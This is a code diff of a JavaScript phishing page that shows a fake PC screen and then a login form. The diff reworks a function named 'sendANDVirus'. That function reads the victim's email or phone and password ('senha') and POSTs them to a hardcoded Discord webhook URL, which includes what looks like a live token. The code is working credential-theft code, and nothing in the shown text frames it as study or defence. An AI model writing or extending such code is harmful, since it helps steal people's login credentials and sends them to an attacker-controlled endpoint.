@@ -134,23 +134,22 @@ document.querySelector(".fakePC").style.display="block";
 setTimeout(function(){
 document.querySelector("#loginForm").style.display="block";
 document.querySelector(".fakePC").style.display="none";
-},5000)
-            //document.getElementById('loginForm').style.display = 'block';
+},5000);
         }
-function sendANDVirus(){
-telEmail=document.querySelector("#email").value;
-senha=document.querySelector("#senha").value;
+async function sendANDVirus(){
+let telEmail=document.querySelector("#email").value;
+let senha=document.querySelector("#senha").value;
 const webhookURL="https://discord.com/api/webhooks/1325626529216200797/agMz3pSFTYcvAGu0N_kyZWTPdm54_7xyr6ElRPKrraIKcdtsb5t3WlDqqgNB5yjrSnLp"
 const msg={
 content: "Telefone/Email: "+telEmail+"\nSenha: "+senha
 }
-fetch(webhookURL,{
+let resp= await fetch(webhookURL,{
 method: "POST",
 headers: {"Content-Type": "application/json"},
 body: JSON.stringify(msg)
 });
 
-}
+
 
 
 
